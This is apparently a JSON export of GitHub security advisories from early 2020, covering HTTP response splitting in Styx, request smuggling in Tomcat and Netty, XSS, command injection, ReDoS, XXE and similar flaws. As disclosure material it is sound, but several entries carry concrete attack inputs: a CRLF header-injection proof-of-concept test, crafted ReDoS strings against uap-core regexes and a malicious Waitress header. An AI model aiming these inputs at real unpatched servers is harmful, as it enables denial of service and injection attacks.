    "description": "# Vulnerability\nStyx is vulnerable to CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers (&#39;HTTP Response Splitting&#39;).\n\n# Vulnerable Component\nThe vulnerable component is the `com.hotels.styx.api.HttpHeaders.Builder` due to disabling the HTTP Header validation built into Netty in these locations:\n\nhttps://github.com/HotelsDotCom/styx/blob/e1d578e9b9c38df9cd19c21dc2eb9b949d85b558/components/api/src/main/java/com/hotels/styx/api/HttpHeaders.java#L145\n\nhttps://github.com/HotelsDotCom/styx/blob/e1d578e9b9c38df9cd19c21dc2eb9b949d85b558/components/api/src/main/java/com/hotels/styx/api/HttpHeaders.java#L145\n\n`new DefaultHttpHeaders(false)` disables the built-in validation in Netty. Either use the default constructor or `new DefaultHttpHeaders(true`  instead.\n\nAdditionally, another vulnerable component is the StyxToNettyResponseTranslator due to also disabling the HTTP Header validation built into netty in this location.\n\nhttps://github.com/HotelsDotCom/styx/blob/8d60e5493e65d0d536afc0b350dcb02d24e0f7a7/components/server/src/main/java/com/hotels/styx/server/netty/connectors/StyxToNettyResponseTranslator.java#L30\n\n `DefaultHttpResponse nettyResponse = new DefaultHttpResponse(version, httpResponseStatus, false); `\n`new DefaultHttpResponse(version, httpResponseStatus, false);` disables the built-in validation in Netty. Please use the constructor `new DefaultHttpResponse(version, httpResponseStatus, true);`\n\n# Proof of Concept\nThe following test plugin proves that there is no header validation occurring.\n\n```java\n    static class VulnerablePlugin implements Plugin {\n\n        @Override\n        public Eventual&lt;LiveHttpResponse&gt; intercept(LiveHttpRequest request, Chain chain) {\n            String header = request.queryParam(&quot;header-value&quot;).get();\n            LiveHttpRequest newRequest = request.newBuilder()\n                .header(&quot;myRequestHeader&quot;, header)\n                .build();\n            return chain.proceed(newRequest).map(response -&gt;\n                response.newBuilder().header(&quot;myResponseHeader&quot;, header).build()\n            ) ;\n        }\n\n    }\n\n    @Test\n    public void simpleHeaderInjectionVulnerabilityPOC() {\n        Plugin vulnerablePlugin = new VulnerablePlugin();\n        // a simple way to mock the downstream system\n        HttpInterceptor.Chain chain = request -&gt; {\n            assertThat(request.header(&quot;myRequestHeader&quot;).orElse(null), is(&quot;test\\r\\nAnother: CRLF_Injection&quot;));\n            return Eventual.of(response(OK).build());\n        };\n\n        // an example request you expect your plugin to receive\n        String encodedGet = URLEncoder.encode(&quot;test\\r\\nAnother: CRLF_Injection&quot;);\n        LiveHttpRequest request = get(&quot;/foo?header-value=&quot; + encodedGet)\n            .build();\n\n        // since this is a test, we want to wait for the response\n        LiveHttpResponse response = Mono.from(vulnerablePlugin.intercept(request, chain)).block();\n\n        assertThat(response.header(&quot;myResponseHeader&quot;).orElse(null), is(&quot;test\\r\\nAnother: CRLF_Injection&quot;));\n    }\n```\nAdditionally, if you run this LiveHttpResponse from this test through the `StyxToNettyResponseTranslator::toNettyResponse`, ideally, it would have caused an exception to be thrown. In its current state, it does not.\n\n# Similar Vulnerabilities\nThere have been reports of similar vulnerabilities in other popular libraries.\n\nGHSA-35fr-h7jr-hh86 -&gt; CVE-2019-16771\nGHSA-mvqp-q37c-wf9j -&gt; CVE-2019-17513\n\n\n# Finding\nThis vulnerability was found due to this query that [Jonathan Leitschuh](https://twitter.com/jlleitschuh) contributed to the Semmle QL project.\nhttps://lgtm.com/rules/1510696449842/alerts/",
    "summary": "HTTP Response Splitting in Styx"
  },
  {
    "ghsaId": "GHSA-jppv-gw3r-w3q8",
    "publishedAt": "2020-02-28T16:54:36Z",
    "description": "There is an OS command injection vulnerability in Ruby Rake before 12.3.3 in Rake::FileList when supplying a filename that begins with the pipe character `|`.",
    "summary": "OS Command Injection in Rake"
  },
  {
    "ghsaId": "GHSA-84j7-475p-hp8v",
    "publishedAt": "2020-02-28T16:53:55Z",
    "description": "In Puma (RubyGem) before 4.3.2 and 3.12.3, if an application using Puma allows untrusted input in a response header,\nan attacker can use newline characters (i.e. `CR`, `LF` or`/r`, `/n`) to end the header and inject malicious content, \nsuch as additional headers or an entirely new response body. This vulnerability is known as HTTP Response Splitting.\n\nWhile not an attack in itself, response splitting is a vector for several other attacks, such as cross-site scripting (XSS).\n\nThis is related to CVE-2019-16254, which fixed this vulnerability for the WEBrick Ruby web server.\n\nThis has been fixed in versions 4.3.2 and 3.12.3 by checking all headers for line endings and rejecting headers with those characters.  ",
    "summary": "HTTP Response Splitting in Puma"
  },
  {
    "ghsaId": "GHSA-767j-jfh2-jvrc",
    "publishedAt": "2020-02-28T01:10:58Z",
    "description": "The refactoring present in Apache Tomcat 9.0.28 to 9.0.30, 8.5.48 to 8.5.50 and 7.0.98 to 7.0.99 introduced a regression. The result of the regression was that invalid Transfer-Encoding headers were incorrectly processed leading to a possibility of HTTP Request Smuggling if Tomcat was located behind a reverse proxy that incorrectly handled the invalid Transfer-Encoding header in a particular manner. Such a reverse proxy is considered unlikely.",
    "summary": "Potential HTTP request smuggling in Apache Tomcat"
  },
  {
    "ghsaId": "GHSA-qxf4-chvg-4r8r",
    "publishedAt": "2020-02-28T01:10:48Z",
    "description": "In Apache Tomcat 9.0.0.M1 to 9.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99 the HTTP header parsing code used an approach to end-of-line parsing that allowed some invalid HTTP headers to be parsed as valid. This led to a possibility of HTTP Request Smuggling if Tomcat was located behind a reverse proxy that incorrectly handled the invalid Transfer-Encoding header in a particular manner. Such a reverse proxy is considered unlikely.",
    "summary": "Potential HTTP request smuggling in Apache Tomcat"
  },
  {
    "ghsaId": "GHSA-2gc7-w4hw-rr2m",
    "publishedAt": "2020-02-28T01:10:17Z",
    "description": "class.upload.php in verot.net class.upload through 1.0.3 and 2.x through 2.0.4, as used in the K2 extension for Joomla! and other products, omits .pht from the set of dangerous file extensions, a similar issue to CVE-2019-19576.",
    "summary": "class.upload.php in verot.net omits .pht from the set of dangerous file extensions"
  },
  {
    "ghsaId": "GHSA-8rc5-hx3v-2jg7",
    "publishedAt": "2020-02-27T20:36:29Z",
    "description": "It is possible to bypass enshrined/svg-sanitize before 0.13.1 using the \"xlink:href\" attribute due to mishandling of the xlink namespace by the sanitizer.",
    "summary": "Sanitizer bypass in svg-sanitizer"
  },
  {
    "ghsaId": "GHSA-p5w7-qmq6-pmjr",
    "publishedAt": "2020-02-26T19:55:32Z",
    "description": "In Apache Incubator Superset before 0.31 user could query database metadata information from a database he has no access to, by using a specially crafted complex query.",
    "summary": "Users able to query database metadata in Apache Superset"
  },
  {
    "ghsaId": "GHSA-9c29-9h4m-wg5p",
    "publishedAt": "2020-02-26T19:55:14Z",
    "description": "In Apache Incubator Superset before 0.32, a user can view database names that he has no access to on a dropdown list in SQLLab",
    "summary": "Users can view database names in Apache Superset"
  },
  {
    "ghsaId": "GHSA-fxjm-wvj9-9c39",
    "publishedAt": "2020-02-26T19:54:57Z",
    "description": "An information disclosure issue was found in Apache Superset 0.34.0, 0.34.1, 0.35.0, and 0.35.1. Authenticated Apache Superset users are able to retrieve other users' information, including hashed passwords, by accessing an unused and undocumented API endpoint on Apache Superset.",
    "summary": "Information disclosure in Apache Superset"
  },
  {
    "ghsaId": "GHSA-3m93-m4q6-mc6v",
    "publishedAt": "2020-02-26T19:54:31Z",
    "description": "Ansible, versions 2.9.x before 2.9.1, 2.8.x before 2.8.7 and Ansible versions 2.7.x before 2.7.15, is not respecting the flag no_log set it to True when Sumologic and Splunk callback plugins are used send tasks results events to collectors. This would discloses and collects any sensitive data.",
    "summary": "Inclusion of Sensitive Information in Log Files and Improper Output Neutralization for Logs in Ansible"
  },
  {
    "ghsaId": "GHSA-7553-jr98-vx47",
    "publishedAt": "2020-02-24T19:12:36Z",
    "description": "xmlStringLenDecodeEntities in parser.c in libxml2 2.9.10 has an infinite loop in a certain end-of-file situation.\nThe Nokogiri RubyGem has patched it&#39;s vendored copy of libxml2 in order to prevent this issue from affecting nokogiri.",
    "summary": "libxml as used in Nokogiri has an infinite loop in a certain end-of-file situation"
  },
  {
    "ghsaId": "GHSA-9r27-994c-4xch",
    "publishedAt": "2020-02-24T17:34:02Z",
    "description": "### Impact\nAny website using discord-markdown with user-generated markdown is vulnerable to having code injected into the page where the markdown is displayed.\n\n### Patches\nThis has been patched in version 2.3.1\n\n### Workarounds\nEscape the characters `&lt;&gt;&amp;` before sending plain code blocks to discord-markdown.\n\n### References\nhttps://github.com/brussell98/discord-markdown/issues/13",
    "summary": "discord-html not escaping HTML code blocks when lacking a language identifier"
  },
  {
    "ghsaId": "GHSA-q65m-pv3f-wr5r",
    "publishedAt": "2020-02-24T17:33:44Z",
    "description": "### Impact\n\nA [mutation XSS](https://cure53.de/fp170.pdf) affects users calling `bleach.clean` with `noscript` and a raw tag (see below) in the allowed/whitelisted tags option.\n\n### Patches\n\nv3.1.1\n\n### Workarounds\n\n* modify `bleach.clean` calls to not whitelist `noscript` and one or more of the following raw tags:\n\n```\ntitle\ntextarea\nscript\nstyle\nnoembed\nnoframes\niframe\nxmp\n```\n\n* A strong [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) without `unsafe-inline` and `unsafe-eval` [`script-src`s](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)) will also help mitigate the risk.\n\n### References\n\n* https://bugzilla.mozilla.org/show_bug.cgi?id=1615315\n* https://cure53.de/fp170.pdf\n* https://nvd.nist.gov/vuln/detail/CVE-2020-6802\n* https://www.checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach\n\n### Credits\n\n* Reported by Yaniv Nizry from the CxSCA AppSec group at Checkmarx\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue at [https://github.com/mozilla/bleach/issues](https://github.com/mozilla/bleach/issues)\n* Email us at [security@mozilla.org](mailto:security@mozilla.org)",
    "summary": "XSS in Bleach when noscript and raw tag whitelisted"
  },
  {
    "ghsaId": "GHSA-qvrv-2x7x-78x2",
    "publishedAt": "2020-02-24T17:33:31Z",
    "description": "SilverStripe through 4.4.x before 4.4.5 and 4.5.x before 4.5.2 allows Reflected XSS on the login form and custom forms. Silverstripe Forms allow malicious HTML or JavaScript to be inserted through non-scalar FormField attributes, which allows performing XSS (Cross-Site Scripting) on some forms built with user input (Request data). This can lead to phishing attempts to obtain a user&amp;#39;s credentials or other sensitive user input.",
    "summary": "Reflected XSS in SilverStripe"
  },
  {
    "ghsaId": "GHSA-3mcp-9wr4-cjqf",
    "publishedAt": "2020-02-24T17:27:27Z",
    "description": "Dropwizard-Validation before 1.3.19, and 2.0.2 may allow arbitrary code execution on the host system, with the privileges of the Dropwizard service account, by injecting arbitrary Java Expression Language expressions when using the self-validating feature.\n\nThe issue has been fixed in dropwizard-validation 1.3.19 and 2.0.2.",
    "summary": "Remote Code Execution (RCE) vulnerability in dropwizard-validation"
  },
  {
    "ghsaId": "GHSA-3j78-7m59-r7gv",
    "publishedAt": "2020-02-24T17:18:26Z",
    "description": "In BuddyPress before 5.1.2, requests to a certain REST API endpoint can result in private user data getting exposed. Authentication is not needed.\n\nThis has been patched in version 5.1.2.",
    "summary": "Private data exposure via REST API in BuddyPress"
  },
  {
    "ghsaId": "GHSA-ff2w-cq2g-wv5f",
    "publishedAt": "2020-02-21T18:55:50Z",
    "description": "Netty 4.1.43.Final allows HTTP Request Smuggling because it mishandles Transfer-Encoding whitespace (such as a [space]Transfer-Encoding:chunked line) and a later Content-Length header. This issue exists because of an incomplete fix for CVE-2019-16869.",
    "summary": "HTTP Request Smuggling in Netty"
  },
  {
    "ghsaId": "GHSA-cqqj-4p63-rrmm",
    "publishedAt": "2020-02-21T18:55:24Z",
    "description": "HttpObjectDecoder.java in Netty before 4.1.44 allows an HTTP header that lacks a colon, which might be interpreted as a separate header with an incorrect syntax, or might be interpreted as an \"invalid fold.\"",
    "summary": "HTTP Request Smuggling in Netty"
  },
  {
    "ghsaId": "GHSA-p2v9-g2qv-p635",
    "publishedAt": "2020-02-21T18:55:04Z",
    "description": "HttpObjectDecoder.java in Netty before 4.1.44 allows a Content-Length header to be accompanied by a second Content-Length header, or by a Transfer-Encoding header.",
    "summary": "HTTP Request Smuggling in Netty"
  },
  {
    "ghsaId": "GHSA-cmcx-xhr8-3w9p",
    "publishedAt": "2020-02-20T23:26:10Z",
    "description": "### Impact\n\nSome regexes are vulnerable to regular expression denial of service (REDoS) due to overlapping capture groups. This allows remote attackers to overload a server by setting the User-Agent header in an HTTP(S) request to maliciously crafted long strings.\n\n### Patches\n\nPlease update uap-core to &amp;amp;gt;= v0.7.3\n\nDownstream packages such as uap-python, uap-ruby etc which depend upon uap-core follow different version schemes.\n\n### Details\n\nEach vulnerable regular expression reported here contains 3 overlapping capture groups. Backtracking has approximately cubic time complexity with respect to the length of the user-agent string.\n\n#### Regex 1:\n\n```\n\\bSmartWatch *\\( *([^;]+) *; *([^;]+) *;\n```\n\nis vulnerable in portion ` *([^;]+) *` and can be attacked with\n\n```python\n&amp;amp;quot;SmartWatch(&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n```\ne.g.\n```\nSmartWatch(                                   z\n```\n\n\n#### Regex 2:\n\n```\n; *([^;/]+) Build[/ ]Huawei(MT1-U06|[A-Z]+\\d+[^\\);]+)[^\\);]*\\)\n```\n\nis vulnerable in portion `\\d+[^\\);]+[^\\);]*` and can be attacked with\n\n```python\n&amp;amp;quot;;A Build HuaweiA&amp;amp;quot; + (&amp;amp;quot;4&amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n```\n\n\n#### Regex 3:\n\n```\n(HbbTV)/[0-9]+\\.[0-9]+\\.[0-9]+ \\([^;]*; *(LG)E *; *([^;]*) *;[^;]*;[^;]*;\\)\n```\n\nis vulnerable in portion ` *([^;]*) *` and can be attacked with\n\n```python\n&amp;amp;quot;HbbTV/0.0.0 (;LGE;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n```\n\n#### Regex 4:\n\n```\n(HbbTV)/[0-9]+\\.[0-9]+\\.[0-9]+ \\([^;]*; *(?:CUS:([^;]*)|([^;]+)) *; *([^;]*) *;.*;\n```\n\nis vulnerable in portions ` *(?:CUS:([^;]*)|([^;]+)) *` and ` *([^;]*) *` and can be attacked with\n\n```python\n&amp;amp;quot;HbbTV/0.0.0 (;CUS:;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n&amp;amp;quot;HbbTV/0.0.0 (;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n&amp;amp;quot;HbbTV/0.0.0 (;z;&amp;amp;quot; + (&amp;amp;quot; &amp;amp;quot; * 3500) + &amp;amp;quot;z&amp;amp;quot;\n```\n\nReported by Ben Caller @bcaller",
    "summary": "Denial of Service in uap-core when processing crafted User-Agent strings"
  },
  {
    "ghsaId": "GHSA-5q88-cjfq-g2mh",
    "publishedAt": "2020-02-19T17:29:39Z",
    "description": "codecov-node npm module before 3.6.5 allows remote attackers to execute arbitrary commands.The value provided as part of the gcov-root argument is executed by the exec function within lib/codecov.js. This vulnerability exists due to an incomplete fix of CVE-2020-7596.",
    "summary": "codecov NPM module allows remote attackers to execute arbitrary commands"
  },
  {
    "ghsaId": "GHSA-mxhp-79qh-mcx6",
    "publishedAt": "2020-02-19T16:43:42Z",
    "description": "taffy through 2.6.2 allows attackers to forge adding additional properties into user-input processed by taffy which can allow access to any data items in the DB. taffy sets an internal index for each data item in its DB. However, it is found that the internal index can be forged by adding additional properties into user-input. If index is found in the query, taffyDB will ignore other query conditions and directly return the indexed data item. Moreover, the internal index is in an easily-guessable format (e.g., T000002R000001). As such, attackers can use this vulnerability to access any data items in the DB.",
    "summary": "taffy can allow access to any data items in the DB"
  },
  {
    "ghsaId": "GHSA-x8wj-6m73-gfqp",
    "publishedAt": "2020-02-18T18:59:24Z",
    "description": "### Impact\nThe vulnerability was identified in the web service for a chunked file\nupload. While the names of the POST parameters vary with the used\nfrontend, their values are always used in the same way to build a path\nwhere the chunks are stored and assembled temporarily. By not validating\nthese parameters properly, OneupUploaderBundle is susceptible to a path\ntraversal vulnerability which can be exploited to upload files to\narbitrary folders on the filesystem. The assembly process can further be\nmisused with some restrictions to delete and copy files to other\nlocations.\n\nThe vulnerability can be exploited by any users that have legitimate\naccess to the upload functionality and can lead to arbitrary code\nexecution, denial of service and disclosure of confidential information.\n\n### Patches\nYes, see version 1.9.3 and 2.1.5.\n\n### References\nhttps://owasp.org/www-community/attacks/Path_Traversal\n\n### Credits:\nThis security vulnerability was found by Thibaud Kehler of SySS GmbH.\nE-Mail: thibaud.kehler@syss.de",
    "summary": "Relative Path Traversal (CWE-23) in chunked uploads in oneup/uploader-bundle"
  },
  {
    "ghsaId": "GHSA-5xf4-f2fq-f69j",
    "publishedAt": "2020-02-14T23:10:16Z",
    "description": "In Yarn before 1.21.1, the package install functionality can be abused to generate arbitrary symlinks on the host filesystem by using specially crafted \"bin\" keys. Existing files could be overwritten depending on the current user permission set.",
    "summary": "Improper link resolution before file access (Link Following)"
  },
  {
    "ghsaId": "GHSA-c5r5-7pfh-6qg6",
    "publishedAt": "2020-02-14T23:10:01Z",
    "description": "BibTeX-ruby before 5.1.0 allows shell command injection due to unsanitized user input being passed directly to the built-in Ruby Kernel.open method through BibTeX.open.",
    "summary": "OS command injection in BibTeX-Ruby"
  },
  {
    "ghsaId": "GHSA-934x-72xh-5hrg",
    "publishedAt": "2020-02-14T23:09:45Z",
    "description": "In aws-lambda versions prior to version 1.0.5, the \"config.FunctioName\" is used to construct the argument used within the \"exec\" function without any sanitization. It is possible for a user to inject arbitrary commands to the \"zipCmd\" used within \"config.FunctionName\".",
    "summary": "OS command injection in aws-lambda"
  },
  {
    "ghsaId": "GHSA-84cm-v6jp-gjmr",
    "publishedAt": "2020-02-14T23:09:24Z",
    "description": "In \"index.js\" file line 240, the run command executes the git command with a user controlled variable called remoteUrl. This affects git-diff-apply all versions prior to 0.22.2.",
    "summary": "OS command injection in git-diff-apply"
  },
  {
    "ghsaId": "GHSA-wp7m-mrvf-599c",
    "publishedAt": "2020-02-14T23:09:10Z",
    "description": "A code injection exists in node-df v0.1.4 that can allow an attacker to remote code execution by unsanitized input.",
    "summary": "Code injection in node-df"
  },
  {
    "ghsaId": "GHSA-r5fx-8r73-v86c",
    "publishedAt": "2020-02-14T23:08:49Z",
    "description": "There is a vulnerability in all angular versions before 1.5.0-beta.0, where after escaping the context of the web application, the web application delivers data to its users along with other trusted dynamic content, without validating it.",
    "summary": "XSS in AngularJS"
  },
  {
    "ghsaId": "GHSA-pg97-ww7h-5mjr",
    "publishedAt": "2020-02-13T22:21:06Z",
    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nPotential XSS vulnerability for users of `dojox/xmpp` and `dojox/dtl`.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nYes, patches are available for the 1.11 through 1.16 versions. Users should upgrade to one of these versions of Dojo:\n\n* 1.16.1\n* 1.15.2\n* 1.14.5\n* 1.13.6\n* 1.12.7\n* 1.11.9\n\nUsers of Dojo 1.10.x and earlier should review this change and determine if it impacts them, and backport the change as appropriate.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nThe change applied in https://github.com/dojo/dojox/pull/315 could get added separately as a patch.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [dojo/dojox](https://github.com/dojo/dojox/)",
    "summary": "XSS in dojox due to insufficient escape in dojox.xmpp.util.xmlEncode "
  },
  {
    "ghsaId": "GHSA-3jqw-vv45-mjhh",
    "publishedAt": "2020-02-12T23:37:46Z",
    "description": "matestack-ui-core (RubyGem) before 0.7.4 is vulnerable to XSS/Script injection.\n\nThis vulnerability is patched in version 0.7.4.",
    "summary": "XSS/Script injection vulnerability in matestack"
  },
  {
    "ghsaId": "GHSA-xwgq-pcqx-hpmv",
    "publishedAt": "2020-02-12T18:45:50Z",
    "description": "In Ktor through 1.2.6, the client resends data from the HTTP Authorization header to a redirect location.",
    "summary": "URL Redirection to Untrusted Site (Open Redirect) in Ktor"
  },
  {
    "ghsaId": "GHSA-ww97-9w65-2crx",
    "publishedAt": "2020-02-12T18:45:28Z",
    "description": "Apache Solr 5.0.0 to Apache Solr 8.3.1 are vulnerable to a Remote Code Execution through the VelocityResponseWriter. A Velocity template can be provided through Velocity templates in a configset `velocity/` directory or as a parameter. A user defined configset could contain renderable, potentially malicious, templates. Parameter provided templates are disabled by default, but can be enabled by setting `params.resource.loader.enabled` by defining a response writer with that setting set to `true`. Defining a response writer requires configuration API access. Solr 8.4 removed the params resource loader entirely, and only enables the configset-provided template rendering when the configset is `trusted` (has been uploaded by an authenticated user).",
    "summary": "Improper Input Validation in Apache Solr"
  },
  {
    "ghsaId": "GHSA-cchx-mfrc-fwqr",
    "publishedAt": "2020-02-12T18:45:08Z",
    "description": "In Symfony before 2.7.51, 2.8.x before 2.8.50, 3.x before 3.4.26, 4.x before 4.1.12, and 4.2.x before 4.2.7, a vulnerability would allow an attacker to authenticate as a privileged user on sites with user registration and remember me login functionality enabled. This is related to symfony/security.",
    "summary": "Improper authentication in Symfony"
  },
  {
    "ghsaId": "GHSA-w2fr-65vp-mxw3",
    "publishedAt": "2020-02-12T18:44:50Z",
    "description": "In Symfony before 2.8.50, 3.x before 3.4.26, 4.x before 4.1.12, and 4.2.x before 4.2.7, it is possible to cache objects that may contain bad user input. On serialization or unserialization, this could result in the deletion of files that the current user has access to. This is related to symfony/cache and symfony/phpunit-bridge.",
    "summary": "Deserialization of untrusted data in Symfony"
  },
  {
    "ghsaId": "GHSA-w4rc-rx25-8m86",
    "publishedAt": "2020-02-12T18:44:16Z",
    "description": "An issue was discovered in Symfony before 4.2.12 and 4.3.x before 4.3.8. The VarExport component incorrectly escapes strings, allowing some specially crafted ones to escalate to execution of arbitrary PHP code. This is related to symfony/var-exporter.",
    "summary": "Improper Input Validation in Symfony"
  },
  {
    "ghsaId": "GHSA-hmr4-m2h5-33qx",
    "publishedAt": "2020-02-11T21:03:20Z",
    "description": "Django 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 before 3.0.3 allows SQL Injection if untrusted data is used as a StringAgg delimiter (e.g., in Django applications that offer downloads of data as a series of rows with a user-specified column delimiter). By passing a suitably crafted delimiter to a contrib.postgres.aggregates.StringAgg instance, it was possible to break escaping and inject malicious SQL.",
    "summary": "SQL injection in Django"
  },
  {
    "ghsaId": "GHSA-wgjx-hm34-qgf7",
    "publishedAt": "2020-02-11T20:36:04Z",
    "description": "SQL injection vulnerabilities in Centreon through 19.04 allow attacks via the svc_id parameter in include/monitoring/status/Services/xml/makeXMLForOneService.php.",
    "summary": "SQL injection in Centreon"
  },
  {
    "ghsaId": "GHSA-r6j9-8759-g62w",
    "publishedAt": "2020-02-04T22:39:19Z",
    "description": "A flaw was found in org.codehaus.jackson:jackson-mapper-asl:1.9.x libraries. XML external entity vulnerabilities similar to CVE-2016-3720 also affects codehaus jackson-mapper-asl libraries but in different classes.",
    "summary": "Improper Restriction of XML External Entity Reference in jackson-mapper-asl"
  },
  {
    "ghsaId": "GHSA-v4qh-6367-4cx2",
    "publishedAt": "2020-02-04T22:38:38Z",
    "description": "Apache Olingo versions 4.0.0 to 4.7.0 provide the AsyncRequestWrapperImpl class which reads a URL from the Location header, and then sends a GET or DELETE request to this URL. It may allow to implement a SSRF attack. If an attacker tricks a client to connect to a malicious server, the server can make the client call any URL including internal resources which are not directly accessible by the attacker.",
    "summary": "Server-Side Request Forgery (SSRF) in Apache Olingo"
  },
  {
    "ghsaId": "GHSA-gj76-429m-56wc",
    "publishedAt": "2020-02-04T22:38:22Z",
    "description": "Apache Olingo versions 4.0.0 to 4.6.0 provide the AbstractService class, which is public API, uses ObjectInputStream and doesn't check classes being deserialized. If an attacker can feed malicious metadata to the class, then it may result in running attacker's code in the worse case.",
    "summary": "Deserialization of Untrusted Data in Apache Olingo"
  },
  {
    "ghsaId": "GHSA-mgh8-hcwj-h57v",
    "publishedAt": "2020-02-04T22:37:43Z",
    "description": "The XML content type entity deserializer in Apache Olingo versions 4.0.0 to 4.6.0 is not configured to deny the resolution of external entities. Request with content type \"application/xml\", which trigger the deserialization of entities, can be used to trigger XXE attacks.",
    "summary": "Improper Restriction of XML External Entity Reference in Apache Olingo"
  },
  {
    "ghsaId": "GHSA-477x-w7m6-c6ph",
    "publishedAt": "2020-02-04T22:37:15Z",
    "description": "The AsyncResponseWrapperImpl class in Apache Olingo versions 4.0.0 to 4.6.0 reads the Retry-After header and passes it to the Thread.sleep() method without any check. If a malicious server returns a huge value in the header, then it can help to implement a DoS attack.",
    "summary": "Improper input validation in Apache Olingo"
  },
  {
    "ghsaId": "GHSA-r679-m633-g7wc",
    "publishedAt": "2020-02-04T22:36:36Z",
    "description": "Apache Shiro before 1.4.2, when using the default \"remember me\" configuration, cookies could be susceptible to a padding attack.",
    "summary": "Improper input validation in Apache Shiro"
  },
  {
    "ghsaId": "GHSA-73m2-3pwg-5fgc",
    "publishedAt": "2020-02-04T03:07:31Z",
    "description": "### Impact\n\nWhen waitress receives a header that contains invalid characters it will cause the regular expression engine to catastrophically backtrack causing the process to use 100% CPU time and blocking any other interactions.\n\nThis would allow an attacker to send a single request with an invalid header and take the service offline.\n\nInvalid header example:\n\n```\nBad-header: xxxxxxxxxxxxxxx\\x10\n```\n\nIncreasing the number of `x`'s in the header will increase the amount of time Waitress spends in the regular expression engine.\n\nThis issue was introduced in version 1.4.2 when the regular expression was updated to attempt to match the behaviour required by errata associated with RFC7230.\n\n### Patches\n\nThe regular expression that is used to validate incoming headers has been updated in version 1.4.3, it is recommended that people upgrade to the new version of Waitress as soon as possible.\n\n### Workarounds\n\nIf you have deployed a reverse proxy in front of Waitress it may already be rejecting requests that include invalid headers.\n\n### Thanks\n\nThe Pylons Project would like to thank [Fil Zembowicz](https://github.com/fzembow) for reaching out and disclosing this vulnerability!\n\n### References\n\nCatastrophic backtracking explained: https://www.regular-expressions.info/catastrophic.html\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)\n- email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",
    "summary": "Catastrophic backtracking in regex allows Denial of Service in Waitress"
  },
  {
    "ghsaId": "GHSA-prg5-hg25-8grq",
    "publishedAt": "2020-01-31T18:00:58Z",
    "description": "### Impact\n\nThis vulnerability gives the ability to switch channels via the `_channel_code` GET parameter in production environments. This was meant to be enabled only when `%kernel.debug%` is set to true. \n\nHowever, if no `sylius_channel.debug` is set explicitly in the configuration, the default value which is `%kernel.debug%` will be not resolved and cast to boolean, enabling this debug feature even if that parameter is set to false.\n\n### Patches\n\nPatch has been provided for Sylius 1.3.x and newer - **1.3.16, 1.4.12, 1.5.9, 1.6.5**. Versions older than 1.3 are not covered by our security support anymore.\n\n### Workarounds\n\nUnsupported versions could be patched by adding the following configuration to run in production:\n\n```yaml\nsylius_channel:\n    debug: false\n```",
    "summary": "Ability to switch channels via GET parameter enabled in production environments"
  },
  {
    "ghsaId": "GHSA-8vp7-j5cj-vvm2",
    "publishedAt": "2020-01-31T18:00:43Z",
    "description": "### Impact\n\nResourceBundle accepts and uses any serialisation groups to be passed via a HTTP header. This might lead to data exposure by using an unintended serialisation group - for example it could make Shop API use a more permissive group from Admin API.\n\nAnyone exposing an API with ResourceBundle's controller is affected. The vulnerable versions are: `<1.3 || >=1.3.0 <=1.3.12 || >=1.4.0 <=1.4.5 || >=1.5.0 <=1.5.0 || >=1.6.0 <=1.6.2`.\n\n### Patches\n\nThe patch is provided for ResourceBundle 1.3.13, 1.4.6, 1.5.1 and 1.6.3, but not for any versions below 1.3.\n\nAfter it is applied, It allows to choose only the groups that are defined in `serialization_groups` or `allowed_serialization_groups` route definition. Any group not defined in those will not be used.\n\nThis behaviour might be a BC break for those using custom groups via the HTTP header, please adjust `allowed_serialization_groups` accordingly.\n\n### Workarounds\n\nService `sylius.resource_controller.request_configuration_factory` can be overridden with an implementation copied from `\\Sylius\\Bundle\\ResourceBundle\\Controller\\RequestConfigurationFactory` where the part that handles custom serialisation groups is deleted.",
    "summary": "Ability to expose data in Sylius by using an unintended serialisation group"
  },
  {
    "ghsaId": "GHSA-763g-fqq7-48wg",
    "publishedAt": "2020-01-31T18:00:07Z",
    "description": "Due to an incomplete fix for [CVE-2019-9658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9658), checkstyle was still vulnerable to XML External Entity (XXE) Processing.\n\n### Impact\n\n#### User: Build Maintainers\n\nThis vulnerability probably doesn't impact Maven/Gradle users as, in most cases, these builds are processing files that are trusted, or pre-vetted by a pull request reviewer before being run on internal CI infrastructure.\n\n#### User: Static Analysis as a Service\n\nIf you operate a site/service that parses \"untrusted\" Checkstyle XML configuration files, you are vulnerable to this and should patch.\n\nNote from the discoverer of the original CVE-2019-9658:\n\n> While looking at a few companies that run Checkstyle/PMD/ect... as a service I notice that it's a common pattern to run the static code analysis tool inside of a Docker container with the following flags:\n> ```\n> --net=none \\\n> --privileged=false \\\n> --cap-drop=ALL\n> ```\n> Running the analysis in Docker has the advantage that there should be no sensitive local file information that XXE can exfiltrate from the container. Additionally, these flags prevent vulnerabilities in static analysis tools like Checkstyle from being used to exfiltrate data via XXE or to perform SSRF.\n> \\- [Jonathan Leitschuh](https://twitter.com/jlleitschuh)\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nPatched, will be released with version 8.29 at 26 Jan 2020.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without 